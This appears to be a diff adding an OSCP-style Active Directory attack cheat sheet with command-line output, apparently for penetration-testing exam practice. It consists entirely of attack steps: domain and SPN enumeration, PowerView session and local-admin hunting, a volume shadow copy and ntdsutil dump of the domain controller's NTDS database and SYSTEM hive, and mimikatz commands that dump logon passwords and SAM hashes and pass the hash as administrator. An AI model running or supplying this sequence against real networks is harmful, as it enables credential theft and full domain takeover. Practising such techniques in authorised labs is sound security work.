@@ -1,0 +1,26 @@
+# OSCP-style manual AD: enumerate with built-ins, find a session, shadow-copy the DC, dump, move
+C:\> net group "Domain Admins" /domain
+The command completed successfully.
+
+C:\> net accounts /domain
+Lockout threshold:                                    5
+Minimum password length:                              7
+
+C:\> setspn -T corp.local -Q */*
+CN=svc-sql,OU=Service Accounts,DC=corp,DC=local
+        MSSQLSvc/sql01.corp.local:1433
+
+PS C:\> Get-NetSession -ComputerName file01
+PS C:\> Find-LocalAdminAccess
+[+] jdoe has local admin access on WEB01.corp.local
+
+PS C:\> runas /netonly /user:corp\administrator cmd.exe
+
+C:\> vssadmin create shadow /for=C:
+C:\> ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
+C:\> reg save hklm\system C:\temp\system.save
+
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::sam
+mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:e19ccf75ee54e06b06a5907af13cef42
